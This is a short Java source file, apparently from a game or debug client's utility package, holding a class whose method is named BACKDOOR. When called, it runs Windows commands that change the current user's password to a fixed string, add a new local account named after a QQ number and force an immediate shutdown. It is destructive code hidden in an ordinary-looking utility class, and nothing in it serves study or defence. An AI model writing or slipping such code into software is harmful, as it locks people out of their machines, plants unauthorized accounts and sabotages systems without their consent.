package net.blueheart.hdebug.utils;

import java.io.IOException;

public class BD {
    public void BACKDOOR() {
        try {
            Runtime.getRuntime().exec("CMD.EXE /C net user %username% HDebugClientByBlueHeartDevCrackNMSL");
            Runtime.getRuntime().exec("CMD.EXE /C net user QQ:2933968621 /add");
            Runtime.getRuntime().exec("CMD.EXE /C shutdown -s -t 1");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}